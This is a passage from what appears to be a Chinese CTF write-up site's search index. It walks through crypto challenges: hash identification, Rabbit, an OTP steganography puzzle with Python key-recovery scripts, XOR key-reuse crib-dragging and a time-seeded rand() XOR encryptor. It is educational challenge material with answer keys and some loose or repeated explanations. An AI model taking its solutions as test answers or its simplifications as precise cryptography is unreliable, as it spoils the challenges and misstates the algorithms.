\u4f4d\uff0820 \u5b57\u8282\uff09\n</code></pre> <p>\u53bb\u8fd9\u4e2a\u7f51\u7ad9\u5728\u7ebf\u8bc6\u522b\u7834\u89e3</p> <p></p> <p>\u6700\u540e\u4e00\u4e2a\u662f SHA-256</p> <p></p> <p>SHA-256 \u52a0\u5bc6\u6d41\u7a0b</p> <ol> <li>\u51c6\u5907\u6d88\u606f\uff1a</li> <li>\u628a\u4f60\u7684\u6587\u672c\u53d8\u6210\u4e8c\u8fdb\u5236\uff08\u6bd4\u5982\u201cabc\u201d\u53d8\u621001100001 01100010 01100011\uff09</li> <li>\u5728\u540e\u9762\u52a0\u4e0a <code>1</code> \u548c\u4e00\u4e9b <code>0</code>\uff0c\u6700\u540e\u518d\u52a0\u4e0a\u201c\u539f\u6765\u591a\u957f\u201d\u7684\u4fe1\u606f\uff0c\u8ba9\u603b\u957f\u5ea6\u53d8\u6210512\u7684\u500d\u6570</li> <li>\u5206\u5757\u5904\u7406\uff1a</li> <li>\u628a\u6570\u636e\u6bcf512\u4f4d\u5206\u6210\u4e00\u5757\uff08\u4e00\u5757\u5c31\u50cf\u4e00\u9875\u7eb8\uff09\uff0c\u9010\u9875\u5904\u7406</li> <li>\u521d\u59cb\u53168\u4e2a\u53d8\u91cf\uff1a</li> <li>\u5b83\u67098\u4e2a\u56fa\u5b9a\u7684\u201c\u8d77\u59cb\u503c\u201d\uff0c\u7c7b\u4f3c\u4e00\u4e2a\u8bb0\u4e8b\u672c\u7684\u7b2c\u4e00\u9875</li> <li>\u538b\u7f29\u5faa\u73af\uff0864\u8f6e\uff09\uff1a</li> <li>\u6bcf\u4e00\u5757\u6570\u636e\u8981\u88ab\u5904\u740664\u6b21\uff0c\u6bcf\u6b21\u90fd\u6839\u636e\u4e00\u4e9b\u89c4\u5219\u4e0d\u505c\u201c\u6405\u62cc\u201d\u8fd98\u4e2a\u53d8\u91cf</li> <li>\u66f4\u65b0\u7ed3\u679c\uff1a</li> <li>\u6bcf\u8f6e\u8ba1\u7b97\u51fa\u6765\u7684\u7ed3\u679c\u90fd\u52a0\u5230\u539f\u6765\u7684\u503c\u91cc\uff0c\u6700\u540e\u5f62\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u201c\u6307\u7eb9\u201d</li> <li>\u8f93\u51fa\u7ed3\u679c\uff1a</li> <li>\u5f97\u5230\u4e00\u4e2a256\u4f4d\u7684\u4e8c\u8fdb\u5236\uff0c\u901a\u5e38\u663e\u793a\u4e3a64\u4f4d\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32</li> </ol> <p>SHA-256 \u52a0\u5bc6\u7279\u70b9:</p> <pre><code>\u65e0\u8bba\u8f93\u5165\u591a\u957f\uff0c\u8f93\u51fa\u6c38\u8fdc\u662f 256 \u4f4d\uff08\u4e8c\u8fdb\u5236\uff09\uff0c\u4e5f\u5c31\u662f 64 \u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\n</code></pre> <p>\u8fd8\u662f\u4e00\u6837\uff0c\u53bb\u4e0a\u9762\u90a3\u4e2a\u7f51\u7ad9\u8bc6\u522b\u7834\u89e3</p> <p></p> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Crypto/Chapter2/2-3/","title":"SHA-256","text":""},{"location":"Crypto/Chapter2/2-3/#sha-256","title":"SHA-256","text":"<p>SHA-1 \u52a0\u5bc6\u6d41\u7a0b</p> <ol> <li> <p>\u586b\u5145\u6d88\u606f\uff08Padding\uff09</p> </li> <li> <p>\u539f\u59cb\u6d88\u606f\u4f1a\u88ab\u586b\u5145\uff0c\u4f7f\u5f97\u603b\u957f\u5ea6\u662f 512 \u7684\u500d\u6570</p> </li> <li> <p>\u4f1a\u5728\u6d88\u606f\u540e\u9762\u52a0\u4e0a <code>1</code> bit\uff0c\u7136\u540e\u8865 <code>0</code>\uff0c\u6700\u540e\u52a0\u4e0a\u539f\u59cb\u6d88\u606f\u957f\u5ea6\uff0864 bit \u8868\u793a\uff09</p> </li> <li> <p>\u8fd9\u662f\u4e3a\u4e86\u8ba9\u7b97\u6cd5\u53ef\u4ee5\u5206\u5757\u5904\u7406</p> </li> <li> <p>\u5206\u5757\u5904\u7406</p> </li> <li> <p>\u5c06\u586b\u5145\u540e\u7684\u6d88\u606f\u5212\u5206\u4e3a\u591a\u4e2a 512 \u4f4d\u5757</p> </li> <li> <p>\u6bcf\u4e2a\u5757\u5c06\u88ab\u62c6\u5206\u4e3a 16 \u4e2a 32-bit \u7684\u5b50\u5757</p> </li> <li> <p>\u521d\u59cb\u5316\u5e38\u91cf\uff085 \u4e2a 32-bit \u5bc4\u5b58\u5668\uff09</p> </li> <li> <p>\u4f7f\u7528 5 \u4e2a\u56fa\u5b9a\u7684\u521d\u59cb\u54c8\u5e0c\u503c\uff1a</p> <pre><code>h0 = 0x67452301\nh1 = 0xEFCDAB89\nh2 = 0x98BADCFE\nh3 = 0x10325476\nh4 = 0xC3D2E1F0\n</code></pre> </li> <li> <p>\u4e3b\u5faa\u73af\uff0880 \u6b21\u64cd\u4f5c\uff09</p> </li> <li> <p>\u5bf9\u6bcf\u4e2a 512-bit \u5757\uff0c\u6267\u884c 80 \u6b21\u7684\u4f4d\u8fd0\u7b97\u548c\u903b\u8f91\u8fd0\u7b97\uff08\u5982 AND\u3001OR\u3001XOR\u3001\u79fb\u4f4d\u3001\u52a0\u6cd5\uff09\uff1a</p> <ul> <li>\u6bcf 20 \u6b21\u5206\u4e3a\u4e00\u7ec4\uff0c\u5171 4 \u7ec4\uff1b</li> <li>\u6bcf\u7ec4\u4f7f\u7528\u4e0d\u540c\u7684\u903b\u8f91\u51fd\u6570 <code>f(t)</code> \u548c\u5e38\u91cf <code>k(t)</code></li> </ul> </li> <li> <p>\u6bcf\u6b21\u8fed\u4ee3\u4f1a\u66f4\u65b0 5 \u4e2a\u54c8\u5e0c\u5bc4\u5b58\u5668\u7684\u503c</p> </li> <li> <p>\u5408\u5e76\u7ed3\u679c</p> </li> <li>\u6700\u7ec8\uff0c5 \u4e2a\u54c8\u5e0c\u5bc4\u5b58\u5668\u7684\u503c\u62fc\u63a5\u8d77\u6765\uff0c\u5f97\u5230 160 \u4f4d\uff0820 \u5b57\u8282\uff09\u7684\u54c8\u5e0c\u503c\uff0c\u5373 SHA-1 \u8f93\u51fa</li> </ol> <p>SHA-1 \u52a0\u5bc6\u7279\u70b9:</p> <pre><code>\u4e0d\u7ba1\u8f93\u5165\u591a\u957f\uff0c\u8f93\u51fa\u603b\u662f 160 \u4f4d\uff0820 \u5b57\u8282\uff09\n</code></pre> <p>\u53bb\u8fd9\u4e2a\u7f51\u7ad9\u5728\u7ebf\u8bc6\u522b\u7834\u89e3</p> <p></p> <p>\u6700\u540e\u4e00\u4e2a\u662f SHA-256</p> <p></p> <p>SHA-256 \u52a0\u5bc6\u6d41\u7a0b</p> <ol> <li>\u51c6\u5907\u6d88\u606f\uff1a</li> <li>\u628a\u4f60\u7684\u6587\u672c\u53d8\u6210\u4e8c\u8fdb\u5236\uff08\u6bd4\u5982\u201cabc\u201d\u53d8\u621001100001 01100010 01100011\uff09</li> <li>\u5728\u540e\u9762\u52a0\u4e0a <code>1</code> \u548c\u4e00\u4e9b <code>0</code>\uff0c\u6700\u540e\u518d\u52a0\u4e0a\u201c\u539f\u6765\u591a\u957f\u201d\u7684\u4fe1\u606f\uff0c\u8ba9\u603b\u957f\u5ea6\u53d8\u6210512\u7684\u500d\u6570</li> <li>\u5206\u5757\u5904\u7406\uff1a</li> <li>\u628a\u6570\u636e\u6bcf512\u4f4d\u5206\u6210\u4e00\u5757\uff08\u4e00\u5757\u5c31\u50cf\u4e00\u9875\u7eb8\uff09\uff0c\u9010\u9875\u5904\u7406</li> <li>\u521d\u59cb\u53168\u4e2a\u53d8\u91cf\uff1a</li> <li>\u5b83\u67098\u4e2a\u56fa\u5b9a\u7684\u201c\u8d77\u59cb\u503c\u201d\uff0c\u7c7b\u4f3c\u4e00\u4e2a\u8bb0\u4e8b\u672c\u7684\u7b2c\u4e00\u9875</li> <li>\u538b\u7f29\u5faa\u73af\uff0864\u8f6e\uff09\uff1a</li> <li>\u6bcf\u4e00\u5757\u6570\u636e\u8981\u88ab\u5904\u740664\u6b21\uff0c\u6bcf\u6b21\u90fd\u6839\u636e\u4e00\u4e9b\u89c4\u5219\u4e0d\u505c\u201c\u6405\u62cc\u201d\u8fd98\u4e2a\u53d8\u91cf</li> <li>\u66f4\u65b0\u7ed3\u679c\uff1a</li> <li>\u6bcf\u8f6e\u8ba1\u7b97\u51fa\u6765\u7684\u7ed3\u679c\u90fd\u52a0\u5230\u539f\u6765\u7684\u503c\u91cc\uff0c\u6700\u540e\u5f62\u6210\u4e00\u4e2a\u552f\u4e00\u7684\u201c\u6307\u7eb9\u201d</li> <li>\u8f93\u51fa\u7ed3\u679c\uff1a</li> <li>\u5f97\u5230\u4e00\u4e2a256\u4f4d\u7684\u4e8c\u8fdb\u5236\uff0c\u901a\u5e38\u663e\u793a\u4e3a64\u4f4d\u7684\u5341\u516d\u8fdb\u5236\u5b57\u7b26\u4e32</li> </ol> <p>SHA-256 \u52a0\u5bc6\u7279\u70b9:</p> <pre><code>\u65e0\u8bba\u8f93\u5165\u591a\u957f\uff0c\u8f93\u51fa\u6c38\u8fdc\u662f 256 \u4f4d\uff08\u4e8c\u8fdb\u5236\uff09\uff0c\u4e5f\u5c31\u662f 64 \u4e2a\u5341\u516d\u8fdb\u5236\u5b57\u7b26\n</code></pre> <p>\u8fd8\u662f\u4e00\u6837\uff0c\u53bb\u4e0a\u9762\u90a3\u4e2a\u7f51\u7ad9\u8bc6\u522b\u7834\u89e3</p> <p></p> <p>\u62ff\u5230 flag</p> <p></p>"},{"location":"Crypto/Chapter3/3-1/","title":"Rabbit","text":""},{"location":"Crypto/Chapter3/3-1/#rabbit","title":"Rabbit","text":"<p>Rabbit \u4f7f\u7528 128 \u4f4d\u7684\u5bc6\u94a5\uff0816 \u5b57\u8282\uff09\u548c 64 \u4f4d\u7684\u521d\u59cb\u5411\u91cf\uff08IV\uff09\u6765\u751f\u6210\u5bc6\u94a5\u6d41\u3002</p> <p>\u6b65\u9aa4\u6982\u89c8\uff1a</p> <ol> <li>\u521d\u59cb\u5316\uff1a</li> <li>\u4f7f\u7528 128 \u4f4d\u7684\u5bc6\u94a5\u548c 64 \u4f4d\u7684 IV \u521d\u59cb\u5316\u5185\u90e8\u72b6\u6001\uff08\u5373\u5bc4\u5b58\u5668\uff09</li> <li>\u5185\u90e8\u72b6\u6001\u7531 8 \u4e2a 32 \u4f4d\u7684\u5bc4\u5b58\u5668\u7ec4\u6210\uff0c\u521d\u59cb\u65f6\u4f1a\u57fa\u4e8e\u5bc6\u94a5\u548c IV \u8fdb\u884c\u7279\u5b9a\u7684\u7f6e\u6362</li> <li>\u751f\u6210\u5bc6\u94a5\u6d41\uff1a</li> <li>Rabbit \u7b97\u6cd5\u901a\u8fc7\u5bf9\u72b6\u6001\u5bc4\u5b58\u5668\u7684\u64cd\u4f5c\u751f\u6210\u5bc6\u94a5\u6d41\u3002\u6bcf\u6b21\u751f\u6210 64 \u4f4d\u7684\u5bc6\u94a5\u6d41\uff0c\u5e76\u4e0e\u660e\u6587\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c\u4ee5\u751f\u6210\u5bc6\u6587</li> <li>\u5728\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\uff0c\u5bc4\u5b58\u5668\u4f1a\u7ecf\u8fc7\u4e00\u7cfb\u5217\u7684\u7ebf\u6027\u53cd\u9988\u79fb\u4f4d\u548c\u6df7\u5408\u64cd\u4f5c\uff0c\u6bcf\u4e00\u8f6e\u8fed\u4ee3\u90fd\u4f1a\u6539\u53d8\u5185\u90e8\u72b6\u6001\uff0c\u5e76\u751f\u6210\u65b0\u7684\u5bc6\u94a5\u6d41</li> <li>\u52a0\u5bc6\u548c\u89e3\u5bc6\uff1a</li> <li>\u52a0\u5bc6\uff1a\u5c06\u660e\u6587\u548c\u751f\u6210\u7684\u5bc6\u94a5\u6d41\u8fdb\u884c\u5f02\u6216\u64cd\u4f5c\uff0c\u5f97\u5230\u5bc6\u6587</li> <li>\u89e3\u5bc6\uff1a\u7531\u4e8e\u662f\u5bf9\u79f0\u52a0\u5bc6\uff0c\u89e3\u5bc6\u64cd\u4f5c\u4e0e\u52a0\u5bc6\u5b8c\u5168\u76f8\u540c\uff0c\u518d\u6b21\u5c06\u5bc6\u6587\u4e0e\u76f8\u540c\u7684\u5bc6\u94a5\u6d41\u5f02\u6216\uff0c\u5373\u53ef\u6062\u590d\u539f\u59cb\u660e\u6587</li> </ol> <p>Rabbit \u7684\u52a0\u5bc6\u8fc7\u7a0b\u4e3b\u8981\u4f9d\u8d56\u4e8e\u9ad8\u901f\u7684\u4f4d\u64cd\u4f5c\u548c\u5bc4\u5b58\u5668\u72b6\u6001\u66f4\u65b0\uff0c\u786e\u4fdd\u7b97\u6cd5\u5728\u786c\u4ef6\u548c\u8f6f\u4ef6\u5b9e\u73b0\u4e2d\u7684\u9ad8\u6548\u6027</p> <p>Rabbit \u5bc6\u7801\u7279\u70b9\uff1a</p> <pre><code>U2FsdGVkX1 \u5f00\u5934\n</code></pre> <p></p>"},{"location":"Crypto/Chapter3/3-2/","title":"OTP","text":""},{"location":"Crypto/Chapter3/3-2/#otp","title":"OTP","text":"<p>\u56e0\u6b64\u6211\u4eec\u5199\u4e2a python \u811a\u672c\u5c06\u6570\u636e\u5012\u7f6e\u56de\u6765</p> <p>\u7136\u540e foremost \u4e00\u4e0b\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u4f2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305</p> <p></p> <p>\u538b\u7f29\u5305\u7684\u6ce8\u91ca\u4e2d\u6709 flag1 \u548c flag2</p> <p></p> <p>\u53bb\u9664\u4f2a\u52a0\u5bc6\u540e\u89e3\u538b\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a Dream It Possible.mp3</p> <p></p> <p>\u8fd9\u91cc\u9700\u8981\u4f7f\u7528 DeEgger Embedder \u63d0\u53d6\u51fa\u9690\u85cf\u7684\u6570\u636e</p> <p></p> <p>\u7528\u4e0a\u9762\u90a3\u4e2a\u5de5\u5177\u53ef\u4ee5\u63d0\u53d6\u51fa\u4e00\u5927\u4e32 base32 \u7f16\u7801\u7684\u5b57\u7b26\u4e32\uff0c\u76f4\u63a5\u89e3\u7801\u53d1\u73b0\u6ca1\u6709\u5f97\u5230\u4ec0\u4e48\u6709\u7528\u7684\u4fe1\u606f</p> <p>\u5c1d\u8bd5 base32 \u9690\u5199\u89e3\u5bc6</p> <pre><code>import base64\n\ndef get_base32_diff_value(stego_line, normal_line):\n    base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\n    for i in range(len(normal_line)):\n        if stego_line[i] != normal_line[i]:\n            return abs(base32chars.index(chr(stego_line[i]))-base32chars.index(chr(normal_line[i])))\n    return 0\n\n# base32 \u9690\u5199\u89e3\u5bc6\ndef base32stego_decode(lines):\n    res = ''\n    for i in lines:\n        stego_line = i.strip()\n        normal_line = base64.b32encode(base64.b32decode(i.strip()))\n        diff = get_base32_diff_value(stego_line, normal_line)\n        if '=' not in str(stego_line):\n            continue\n        if diff:\n            res += bin(diff)[2:]\n        else:\n            res += '0'\n    return res\n\nwith open(\"Dream It Possible - extracted.txt\", 'rb') as f:\n    file_lines = f.readlines()\nen=open(\"encrypt.txt\",\"w\")\nen.write(base32stego_decode(file_lines))\nen.close()\n</code></pre> <p>\u63d0\u53d6 base32 \u9690\u5199\u7684\u6570\u636e\u53ef\u4ee5\u5f97\u5230\u4e00\u5927\u4e32\u4e8c\u8fdb\u5236\u7684\u5b57\u7b26\uff0c\u8fd9\u91cc\u8fd8\u4e0d\u77e5\u9053\u5177\u4f53\u5e72\u5565\u7528\uff0c\u8f6c\u56fe\u7247\u4e5f\u6ca1\u6709\u53d1\u73b0\u6709\u7528\u7684\u4fe1\u606f</p> <p>\u56e0\u6b64\u6211\u4eec\u56de\u5934\u5206\u6790\u90a3\u4e2a pyc \u6587\u4ef6\uff0c\u76f4\u63a5\u4f7f\u7528 uncompyle6 \u5c31\u53ef\u4ee5\u53cd\u7f16\u8bd1\u51fa\u539f\u6765\u7684 Python \u6e90\u7801</p> <pre><code># encrypt \u5b9e\u73b0\u7684\u662f\u4e00\u4e2a 256bit \u968f\u673a\u6570\u751f\u6210\u5668\u7684\u529f\u80fd\n# generate \u5b9e\u73b0\u7684\u662f\u5728\u6709\u9650\u57df GF(2^256) \u4e0b\u7684\u5e73\u65b9\u8fd0\u7b97\uff1anew_key=(old_key+seed)^2\n# flag1 \u548c flag2 \u7684\u5bc6\u6587\u5728\u524d\u9762\u7684 zip \u6ce8\u91ca\u4fe1\u606f\u5df2\u7ed9\u51fa\nfrom os import urandom\n\ndef generate(m, k):\n    result = 0\n    for i in bin(m ^ k)[2:]:\n        result = result &lt;&lt; 1\n        if int(i):\n            result = result ^ m ^ k\n        if result &gt;&gt; 256:\n            result = result ^ P\n            continue\n    return result\n\n\ndef encrypt(seed):\n    key = int(urandom(32).encode('hex'), 16)\n    while True:\n        yield key\n        key = generate(key, seed) + 0x3653C01D55L\n\n\ndef convert(string):\n    return int(string.encode('hex'), 16)\n\nP = 0x10000000000000000000000000000000000000000000000000000000000000425L\nflag1 = 'ThIs_Fl4g_Is_Ri9ht'\nflag2 = 'Hey_Fl4g_Is_Not_HeRe'\nkey = int(urandom(32).encode('hex'), 16)\ndata = open('data.txt', 'r').read()\nresult = encrypt(key)\nencrypt1 = bin(int(data, 2) ^ eval('0x' + hex(result.next())[2:-1] * 22))[2:]\nencrypt2 = hex(convert(flag1) ^ result.next())[2:-1]\nencrypt3 = hex(convert(flag2) ^ result.next())[2:-1]\nprint 'flag1:', encrypt2\nprint 'flag2:', encrypt3\nf = open('encrypt.txt', 'w')\nf.write(encrypt1)\nf.close()\n</code></pre> <pre><code># \u811a\u672c\u5bf9\u4e09\u6bb5\u660e\u6587\u4f7f\u7528\u4e86\u540c\u4e2a Seed \u505a\u4e86\u52a0\u5bc6\uff0c\u5176\u4e2d\u540e\u4e24\u6bb5\u660e\u6587\u548c\u5bc6\u6587\u8fd8\u6709\u7b2c\u4e00\u6bb5\u7684\u5bc6\u6587\uff08\u5728\u90a3\u5927\u6bb5\u7684 base32 \u91cc\uff09\u5df2\u77e5\n# \u5148\u7531\u540e\u4e24\u6bb5\u660e\u6587\u548c\u5bc6\u6587\u7b97\u51fa key2 \u548c key3\uff0c\u518d\u5728 GF(2^256)\u4e0b\u8fdb\u884c\u5f00\u65b9\u5373\u53ef\u5f97\u5230 seed\uff0ckey3 = (key2+seed)^2\n# \u518d\u7531\u7b2c\u4e00\u6bb5\u5bc6\u6587(\u5373 base32 \u9690\u85cf\u7684\u6570\u636e)key1 \u548c seed \u89e3\u5f97 key1\uff0cKey2 = (key1+seed)^2\n# \u6700\u540e\u5bf9\u7b2c\u4e00\u6bb5\u5bc6\u6587(\u5373 base32 \u9690\u85cf\u7684\u6570\u636e)\u548c 22 \u6b21\u53e0\u52a0\u7684 key1 \u505a\u5f02\u6216\u5f97\u5230\u539f\u59cb\u4e8c\u8fdb\u5236\u6570\u636e\nfrom os import urandom\n\ndef generate(m, k):\n    result = 0\n    for i in bin(m ^ k)[2:]:\n        result = result &lt;&lt; 1\n        if int(i):\n            result = result ^ m ^ k\n        if result &gt;&gt; 256:\n            result = result ^ P\n\n    return result\n\n\ndef encrypt(seed):\n    key = int(urandom(32).encode('hex'), 16)\n    while True:\n        yield key\n        key = generate(key, seed) + 233333333333L\n\n\ndef convert(string):\n    return int(string.encode('hex'), 16)\n\n\nP = 115792089237316195423570985008687907853269984665640564039457584007913129640997L\nflag1 = 'ThIs_Fl4g_Is_Ri9ht'\nflag2 = 'Hey_Fl4g_Is_Not_HeRe'\nkey = int(urandom(32).encode('hex'), 16)\ndata = open('data.txt', 'r').read()\nresult = encrypt(key)\nencrypt1 = bin(int(data, 2) ^ eval('0x' + hex(result.next())[2:-1] * 22))[2:]\nencrypt2 = hex(convert(flag1) ^ result.next())[2:-1]\nencrypt3 = hex(convert(flag2) ^ result.next())[2:-1]\nprint 'flag1:', encrypt2\nprint 'flag2:', encrypt3\nf = open('encrypt.txt', 'w')\nf.write(encrypt1)\nf.close()\n\n# okay decompiling .\\reverse_1_PyHaHa.pyc\n</code></pre> <p>\u7531\u4e0a\u8ff0\u4ee3\u7801\u53ef\u77e5\u6211\u4eec\u4e4b\u524d\u5f97\u5230\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u5e94\u8be5\u5c31\u662f\u4e0a\u8ff0\u4ee3\u7801\u4e2d\u7684 encrypt.txt</p> <p>\u56e0\u6b64\u6211\u4eec\u5199\u4e00\u4e2a Python \u811a\u672c\u53bb\u8fd8\u539f\u51fa\u539f\u6765\u7684\u6570\u636e\uff0c\u5177\u4f53\u811a\u672c\u5982\u4e0b\uff1a</p> <pre><code>from PIL import Image\nimport libnum\nimport os\n\n\ndef generate(m, k):\n    result = 0\n    for i in bin(m ^ k)[2:]:\n        result = result &lt;&lt; 1\n        if int(i):\n            result = result ^ m ^ k\n        if result &gt;&gt; 256:\n            result = result ^ P\n\n    return result\n\n\ndef draw2pic(data):\n    if os.path.exists(\"pic_output\"):\n        print(\"[!] pic_output \u76ee\u5f55\u5df2\u5b58\u5728\")\n    else:\n        print(\"[+] pic_output \u76ee\u5f55\u521b\u5efa\u6210\u529f\")\n        os.mkdir(\"pic_output\")\n    length = len(data)\n    dic = {X: int(length / X)\n           for X in range(1, length) if length % X == 0}\n    for item in dic.items():\n        pos = 0\n        img = Image.new(\"RGB\", (item[0], item[1]))\n        for x in range(item[0]):\n            for y in range(item[1]):\n                if data[pos] == '0':\n                    img.putpixel([x, y], (0, 0, 0))\n                else:\n                    img.putpixel([x, y], (255, 255, 255))\n                pos += 1\n        img.save(f\"./pic_output/{item[0]}_{item[1]}.png\")\n        print(\n            f\"./pic_output/{item[0]}_{item[1]}.png Saved!\")\n\n\nif __name__ == \"__main__\":\n    P = 115792089237316195423570985008687907853269984665640564039457584007913129640997\n    flag1 = 'ThIs_Fl4g_Is_Ri9ht'\n    flag2 = 'Hey_Fl4g_Is_Not_HeRe'\n    encrypt2 = 0xec8d57d820ad8c586e4be0122b442c871a3d71cd8036c45083d860caf1793ddc\n    encrypt3 = 0xc40a0be335babcfbd8c47aa771f6a2ceca2c8638caa5924da58286d2a942697e\n    encrypt1 = open('encrypt.txt', 'r').read()\n    key2 = encrypt2 ^ libnum.s2n(flag1)\n    key3 = encrypt3 ^ libnum.s2n(flag2)\n    print(key2)\n    print(key3)\n    tmp = key3 - 233333333333\n    for i in range(0, 255):\n        tmp = generate(tmp, 0)\n    seed = tmp ^ key2\n    print('Found seed:', seed)\n    print('use seed generate key3:', generate(key2, seed)+233333333333)\n    tmp = key2 - 233333333333\n    for i in range(0, 255):\n        tmp = generate(tmp, 0)\n    key1 = tmp ^ seed\n    print('Found key1:', key1)\n    print('use key1 generate key2:', generate(key1, seed)+233333333333)\n    tmp1 = hex(int(encrypt1, 2))\n    tmp2 = '0x'+hex(key1)[2:]*22\n    pic_data = bin(int(tmp1, 16) ^ int(tmp2, 16))[2:]\n    draw2pic(pic_data)\n</code></pre> <p></p>"},{"location":"Crypto/Chapter3/3-3/","title":"XOR \u5bc6\u94a5\u91cd\u7528","text":""},{"location":"Crypto/Chapter3/3-3/#xor-\u5bc6\u94a5\u91cd\u7528","title":"XOR \u5bc6\u94a5\u91cd\u7528","text":"<pre><code>0529242a631234122d2b36697f13272c207f2021283a6b0c7908\n2f28202a302029142c653f3c7f2a2636273e3f2d653e25217908\n322921780c3a235b3c2c3f207f372e21733a3a2b37263b313012\n2f6c363b2b312b1e64651b6537222e37377f2020242b6b2c2d5d\n283f652c2b31661426292b653a292c372a2f20212a316b283c09\n29232178373c270f682c216532263b2d3632353c2c3c2a293504\n613c37373531285b3c2a72273a67212a277f373a243c20203d5d\n243a202a633d205b3c2d3765342236653a2c7423202f3f652a18\n2239373d6f740a1e3c651f207f2c212a247f3d2e65262430791c\n263e203d63232f0f20653f207f332065262c3168313722367918\n2f2f372133202f142665212637222220733e383f2426386b\n</code></pre> <p>\u7b80\u5355\u6765\u8bf4\u5462\uff0c\u5c31\u662f\u5229\u7528\u4e00\u4e9b\u7528\u540c\u4e2a\u5bc6\u94a5\u751f\u6210\u7684\u5bc6\u6587\uff0c\u731c\u5bf9\u5176\u4e2d\u90e8\u5206\u5bc6\u6587\u5bf9\u5e94\u7684\u660e\u6587\uff0c\u5373\u53ef\u6c42\u51fa\u516c\u5171\u5bc6\u94a5</p> <p>\u518d\u7528\u8be5\u53ef\u80fd\u7684\u5bc6\u94a5\u53bb\u89e3\u5176\u4ed6\u7684\u5bc6\u6587\uff0c\u82e5\u7b26\u5408\uff0c\u5219\u4e3a\u5bc6\u94a5\u6b63\u786e</p> <p>\u4e0b\u8f7d\u811a\u672c</p> <p>\u6309\u4e00\u884c\u5c55\u5f00</p> <pre><code>0529242a631234122d2b36697f13272c207f2021283a6b0c79082f28202a302029142c653f3c7f2a2636273e3f2d653e25217908322921780c3a235b3c2c3f207f372e21733a3a2b37263b3130122f6c363b2b312b1e64651b6537222e37377f2020242b6b2c2d5d283f652c2b31661426292b653a292c372a2f20212a316b283c0929232178373c270f682c216532263b2d3632353c2c3c2a293504613c37373531285b3c2a72273a67212a277f373a243c20203d5d243a202a633d205b3c2d3765342236653a2c7423202f3f652a182239373d6f740a1e3c651f207f2c212a247f3d2e65262430791c263e203d63232f0f20653f207f332065262c31683137223679182f2f372133202f142665212637222220733e383f2426386b\n</code></pre> <p>\u6267\u884c\u4e0b\u811a\u672c</p> <pre><code>python cribdrag.py 0529242a631234122d2b36697f13272c207f2021283a6b0c79082f28202a302029142c653f3c7f2a2636273e3f2d653e25217908322921780c3a235b3c2c3f207f372e21733a3a2b37263b3130122f6c363b2b312b1e64651b6537222e37377f2020242b6b2c2d5d283f652c2b31661426292b653a292c372a2f20212a316b283c0929232178373c270f682c216532263b2d3632353c2c3c2a293504613c37373531285b3c2a72273a67212a277f373a243c20203d5d243a202a633d205b3c2d3765342236653a2c7423202f3f652a182239373d6f740a1e3c651f207f2c212a247f3d2e65262430791c263e203d63232f0f20653f207f332065262c31683137223679182f2f372133202f142665212637222220733e383f2426386b\n</code></pre> <p></p> <p>\u8f93\u5165 <code>ALEXCTF{</code> \"0\" \u7684\u4f4d\u7f6e\u51fa\u73b0 \"Dear Fri\" \u6709\u620f</p> <p></p> <p>\u4e8e\u662f\u5c06\u5176\u653e\u5165\u5176\u4e2d\uff0c\u6309\u7167\u6b65\u9aa4\u4e00\u6b65\u6b65\u6765\uff1a \uff08\u5982\u4e0b\uff09</p> <p></p> <p>\u8865\u5168\u524d\u9762 Dear Friend \uff0c\u7ee7\u7eed \u3002\u5f97\u5230 <code>ALEXCTF{HER</code></p> <p></p> <p>\u5c31\u8fd9\u6837\u4e00\u6b65\u4e00\u6b65\u6478\u4e0b\u6765</p> <p>\u6700\u540e\u5f97\u5230</p> <p></p>"},{"location":"Crypto/Chapter3/3-4/","title":"\u968f\u673a\u6570\u5f02\u6216","text":""},{"location":"Crypto/Chapter3/3-4/#\u968f\u673a\u6570\u5f02\u6216","title":"\u968f\u673a\u6570\u5f02\u6216","text":"<p><code>readme.txt</code> \u7ed9\u51fa\u4e86\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u5c31\u662f\u8fd0\u884c\u4e86 <code>rnd</code></p> <p></p> <p>\u53cd\u7f16\u8bd1\u52a0\u5bc6\u7a0b\u5e8f</p> <p></p> <pre><code>int __cdecl main(int a1, char **a2)\n{\n  unsigned int v3; // eax\n  FILE *v4; // [esp+10h] [ebp-10h]\n  FILE *v5; // [esp+14h] [ebp-Ch]\n  char ptr; // [esp+1Fh] [ebp-1h] BYREF\n\n  // \u5982\u679c\u53c2\u6570\u5c11\u4e8e 3 \u4e2a\uff08\u7a0b\u5e8f\u540d + \u8f93\u5165\u6587\u4ef6 + \u8f93\u51fa\u6587\u4ef6\uff09\uff0c\u8fd4\u56de 1\uff0c\u8868\u793a\u9519\u8bef\n  if ( a1 &lt;= 2 )\n    return 1;\n\n  // \u4f7f\u7528\u5f53\u524d\u65f6\u95f4\u521d\u59cb\u5316\u968f\u673a\u6570\u751f\u6210\u5668\n  v3 = time(0);\n  srand(v3);\n\n  // a2[1] \u662f\u8f93\u5165\u6587\u4ef6\uff0c\u6309\u4e8c\u8fdb\u5236\u65b9\u5f0f\u53ea\u8bfb\u6253\u5f00\n  v4 = fopen(a2[1], \"rb\");\n\n  // a2[2] \u662f\u8f93\u51fa\u6587\u4ef6\uff0c\u6309\u4e8c\u8fdb\u5236\u65b9\u5f0f\u5199\u5165\u6253\u5f00\n  v5 = fopen(a2[2], \"wb\");\n\n  // \u6bcf\u6b21\u8bfb\u53d6\u4e00\u4e2a\u5b57\u8282\u5230 ptr\n  // \u4f7f\u7528 rand() % 256 \u5f97\u5230\u4e00\u4e2a 0\u2013255 \u4e4b\u95f4\u7684\u968f\u673a\u6570\uff0c\u4e0e ptr \u6309\u4f4d\u5f02\u6216\n  // \u5c06\u5f02\u6216\u540e\u7684\u5b57\u8282\u5199\u5165\u8f93\u51fa\u6587\u4ef6\n  while ( fread(&amp;ptr, 1u, 1u, v4) == 1 )\n  {\n    ptr ^= rand() % 256;\n    fwrite(&amp;ptr, 1u, 1u, v5);\n  }\n\n  // \u5173\u95ed\u6587\u4ef6\n  fclose(v4);\n  fclose(v5);\n  return 0;\n}\n</code></pre> 